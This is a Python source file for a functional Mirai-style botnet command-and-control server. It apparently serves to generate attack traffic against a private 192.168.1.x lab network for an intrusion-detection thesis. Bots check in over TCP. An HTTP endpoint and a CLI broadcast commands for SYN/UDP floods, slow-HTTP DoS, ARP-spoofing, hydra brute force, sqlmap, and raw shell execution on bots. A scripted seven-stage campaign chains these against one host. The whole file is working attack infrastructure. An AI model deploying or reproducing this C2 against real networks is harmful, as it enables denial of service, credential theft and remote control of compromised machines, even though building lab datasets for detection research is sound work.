"""
Mirai-style C2 (Command & Control) server.
  - TCP/2300  : bot check-in + command channel (the Mirai CnC port)
  - HTTP/5300 : operator control plane — POST /attack {"cmd": "..."} to
                broadcast an attack to every connected bot.
Mimics DataSense's Mirai CnC component but adds an active HTTP control
endpoint so the host can drive campaigns without `docker exec`.
"""
import socket, threading, time, json, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CNC_PORT    = 2300       # DataSense Mirai CnC port
SCAN_PORT   = 48101      # Mirai scan-receiver port (informational)
HTTP_PORT   = 5300       # operator control plane

bots = {}                # bot_id -> {sock, addr, last_seen}
lock = threading.Lock()


# ─── Bot CnC channel ───────────────────────────────────────────────────────
def handle_bot(sock, addr):
    bot_id = None
    try:
        sock.settimeout(120)      # generous initial timeout for REGISTER
        first = sock.recv(256).decode(errors="ignore").strip()
        if not first.startswith("REGISTER"):
            sock.close(); return
        bot_id = first.split(maxsplit=1)[1] if " " in first else f"bot_{addr[1]}"
        with lock:
            bots[bot_id] = {"sock": sock, "addr": addr,
                            "registered": time.time(),
                            "last_seen": time.time()}
        print(f"[C2] +bot  {bot_id}  from {addr[0]}", flush=True)
        sock.sendall(b"WELCOME\n")
        # Long timeout — keep-alive thread sends a PING every 25 s so this
        # only trips on genuinely dead bots (no PONG for 90 s).
        sock.settimeout(90)
        while True:
            try:
                data = sock.recv(256)
            except socket.timeout:
                # No PONG in 90 s → consider bot dead and reconnect.
                print(f"[C2] timeout on {bot_id} — closing", flush=True)
                break
            if not data:
                break
            line = data.decode(errors="ignore").strip()
            if line == "PONG":
                pass     # heartbeat ack, just refresh last_seen below
            elif line == "PING":
                sock.sendall(b"PONG\n")
            with lock:
                if bot_id in bots:
                    bots[bot_id]["last_seen"] = time.time()
    except Exception:
        pass
    finally:
        with lock:
            if bot_id:
                bots.pop(bot_id, None)
        try: sock.close()
        except Exception: pass
        print(f"[C2] -bot  {bot_id or addr}", flush=True)


def keepalive_loop():
    """Send PING every 25 s to every bot to keep TCP sockets alive."""
    while True:
        time.sleep(25)
        with lock:
            for bid, b in list(bots.items()):
                try:
                    b["sock"].sendall(b"PING\n")
                except Exception:
                    # broadcast() will clean it up on next campaign
                    pass


def cnc_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", CNC_PORT))
    s.listen(16)
    print(f"[C2] CnC listening on :{CNC_PORT}", flush=True)
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()


def broadcast(cmd, targets=None):
    """Send a command string to bots. `targets` is a list of bot_ids or None for all."""
    sent, failed = [], []
    with lock:
        for bid, b in list(bots.items()):
            if targets and bid not in targets:
                continue
            try:
                b["sock"].sendall((cmd + "\n").encode())
                sent.append(bid)
            except Exception:
                bots.pop(bid, None)
                failed.append(bid)
    return sent, failed


# ─── HTTP operator control plane ───────────────────────────────────────────
class CtrlHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"[C2-HTTP] {self.address_string()} - {fmt % args}", flush=True)

    def _json(self, code, payload):
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/bots":
            with lock:
                listing = [{"bot_id": bid,
                            "addr": b["addr"][0],
                            "registered": b["registered"],
                            "last_seen": b["last_seen"]}
                           for bid, b in bots.items()]
            self._json(200, {"bots": listing, "count": len(listing)})
        elif self.path == "/health":
            self._json(200, {"status": "ok", "bots": len(bots)})
        else:
            self._json(404, {"error": "unknown path",
                             "help": "GET /bots | GET /health | POST /attack"})

    def do_POST(self):
        if self.path != "/attack":
            self._json(404, {"error": "POST /attack {\"cmd\":\"syn 192.168.1.195 80 15\"}"})
            return
        length = int(self.headers.get("Content-Length", "0"))
        try:
            payload = json.loads(self.rfile.read(length).decode() or "{}")
        except Exception as e:
            self._json(400, {"error": f"bad json: {e}"}); return
        cmd = payload.get("cmd", "").strip()
        targets = payload.get("targets")     # optional list of bot_ids
        if not cmd:
            self._json(400, {"error": "missing 'cmd'"}); return
        sent, failed = broadcast(cmd, targets)
        print(f"[C2] HTTP campaign: cmd='{cmd}'  -> sent={sent}  failed={failed}", flush=True)
        self._json(200, {"cmd": cmd, "sent_to": sent, "failed": failed, "count": len(sent)})


def http_listener():
    srv = ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), CtrlHandler)
    print(f"[C2] HTTP control plane on :{HTTP_PORT}  "
          f"(POST /attack, GET /bots, GET /health)", flush=True)
    srv.serve_forever()


# ─── Interactive CLI (if attached via -it) ─────────────────────────────────
def cli():
    HELP = """Available commands:
  list                                   — list connected bots
  bots                                   — same as list

  Volumetric / network attacks
    attack syn   <ip> <port> <secs>      — broadcast SYN flood
    attack udp   <ip> <port> <secs>      — broadcast UDP flood
    attack http  <ip>        <secs>      — broadcast slow-HTTP DoS
    attack mirai <ip>                    — full Mirai chain (scan+brute+flood)
    attack mitm  <victim> <gw>           — ARP-spoof MITM (30s)

  Recon / brute / web / vuln
    attack recon <ip_or_subnet>          — nmap SYN+version sweep
    attack brute <ip> <ssh|telnet|ftp>   — hydra credential brute
    attack web   <ip>                    — sqlmap auto on /api/sensors?id=1
    attack nikto <ip>                    — nikto web vuln scan
    attack exec  <shell command>         — raw shell on bot

  Orchestration
    campaign                             — run preset 7-stage attack matrix
    quit"""
    print("=" * 60, flush=True)
    print("[C2] Mirai-style CnC CLI ready. Type 'help'.", flush=True)
    print("=" * 60, flush=True)
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line: continue
        if line in ("help", "?"): print(HELP); continue
        if line in ("list", "bots"):
            with lock:
                if not bots: print("  (no bots connected)"); continue
                for bid, b in bots.items():
                    age = time.time() - b["last_seen"]
                    print(f"  {bid:10s} from {b['addr'][0]:15s}  last_seen={age:.0f}s ago")
            continue
        if line == "quit": break
        if line == "campaign":
            run_campaign(); continue
        if line.startswith("attack "):
            sent, failed = broadcast(line[7:])
            print(f"  -> sent to {len(sent)} bot(s): {sent}  failed={failed}")
            continue
        print("  unknown — type 'help'")


def run_campaign():
    """Preset 7-stage campaign — one stage per thesis attack class.
    Stages are sent only to the FIRST bot to keep signatures separable
    in the RADM logs (one attacker IP per class). For the DDoS stage
    we broadcast to all bots."""
    first_bot = None
    with lock:
        if bots:
            first_bot = next(iter(bots.keys()))
    if not first_bot:
        print("[CAMPAIGN] no bots online — aborting", flush=True); return

    stages = [
        # (label,           command,                                wait_s, targets)
        ("recon",  "recon 192.168.1.0/24",                         30, [first_bot]),
        ("web",    "web   192.168.1.195",                          60, [first_bot]),
        ("brute",  "brute 192.168.1.195 ssh",                      35, [first_bot]),
        ("dos",    "syn   192.168.1.195 80 20",                    25, [first_bot]),
        ("ddos",   "syn   192.168.1.195 80 20",                    25, None),         # all bots
        ("mitm",   "mitm  192.168.1.195 192.168.1.193",            35, [first_bot]),
        ("mirai",  "mirai 192.168.1.195 30",                       60, [first_bot]),
    ]
    for name, cmd, wait, targets in stages:
        sent, failed = broadcast(cmd, targets)
        tag = ",".join(sent) if sent else "<none>"
        print(f"[CAMPAIGN] {name:6s} -> {tag}  cmd='{cmd}'  sleeping {wait}s", flush=True)
        time.sleep(wait)
    print("[CAMPAIGN] complete.", flush=True)


# ─── Main ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    threading.Thread(target=cnc_listener,  daemon=True).start()
    threading.Thread(target=http_listener, daemon=True).start()
    threading.Thread(target=keepalive_loop, daemon=True).start()

    if sys.stdin.isatty():
        cli()
    else:
        print("[C2] running headless. Control via:", flush=True)
        print("[C2]   curl http://localhost:5300/bots", flush=True)
        print("[C2]   curl -X POST http://localhost:5300/attack -d '{\"cmd\":\"syn 192.168.1.195 80 15\"}'", flush=True)
        while True:
            time.sleep(60)
            with lock:
                print(f"[C2] heartbeat — {len(bots)} bot(s) online: {list(bots.keys())}", flush=True)
